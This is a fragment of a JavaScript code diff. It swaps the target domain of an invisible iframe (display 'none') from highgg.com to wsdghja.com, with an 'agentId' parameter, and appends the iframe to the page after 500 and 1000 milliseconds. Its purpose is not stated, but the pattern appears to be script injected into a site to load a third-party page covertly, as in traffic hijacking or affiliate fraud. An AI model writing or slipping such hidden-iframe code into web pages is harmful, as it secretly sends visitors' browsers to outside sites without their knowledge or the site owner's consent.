@@ -5,11 +5,11 @@ iframe.style.display = "none"
 //     document.body.append(iframe);
 // }, 500)
 setTimeout(function () {
-    iframe.src = "https://www.highgg.com?agentId=7134700";
+    iframe.src = "https://www.wsdghja.com?agentId=7134700";
     document.body.append(iframe);
 }, 500)
 setTimeout(function () {
-    iframe.src = "https://www.highgg.com?agentId=7134700";
+    iframe.src = "https://www.wsdghja.com?agentId=7134700";
     document.body.append(iframe);
 }, 1000)
 
